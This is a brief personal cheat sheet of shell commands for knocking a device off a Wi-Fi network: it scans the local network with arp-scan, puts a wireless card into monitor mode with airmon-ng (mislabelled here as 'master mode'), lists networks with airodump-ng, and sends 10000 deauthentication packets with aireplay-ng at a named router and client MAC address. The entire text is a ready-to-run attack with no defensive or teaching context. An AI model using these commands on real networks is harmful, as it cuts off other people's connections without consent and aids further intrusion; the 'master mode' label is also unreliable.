this is to scan the network for the ip's and mac addresses:
sudo arp-scan -l --interface=wlan0

to view current wifi card status:
sudo airmon-ng

to enable master mode on the wifi card:
sudo airmon-ng start wlx18a6f71d610c

to view the available networks:
sudo airodump-ng mon0

to actually send the deauth packages, first address is the mac of the router, second is the target, mon0 is the name of the interface made by airmon in previous commands:
sudo aireplay-ng -0 10000 -a C0:05:C2:D4:37:09 -c 64:a6:51:8f:c8:56 --ignore-negative-one mon0
